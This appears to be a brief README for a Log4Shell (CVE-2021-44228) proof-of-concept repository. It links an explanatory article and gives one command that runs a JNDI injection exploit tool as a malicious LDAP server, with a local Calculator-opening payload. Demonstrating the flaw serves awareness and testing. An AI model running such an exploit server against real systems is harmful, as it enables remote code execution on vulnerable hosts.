# Apache-Log4j-POC CVE-2021-44228
Proof of Concept of apache log4j LDAP lookup vulnerability

You can read more about the vulnerability here:
https://blog.cloudflare.com/inside-the-log4j2-vulnerability-cve-2021-44228/

How to run the provided ldap server that returns malicious object ? 

java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "open /Applications/Calculator.app" -A "127.0.0.1"

# Courtesy: https://github.com/welk1n/JNDI-Injection-Exploit
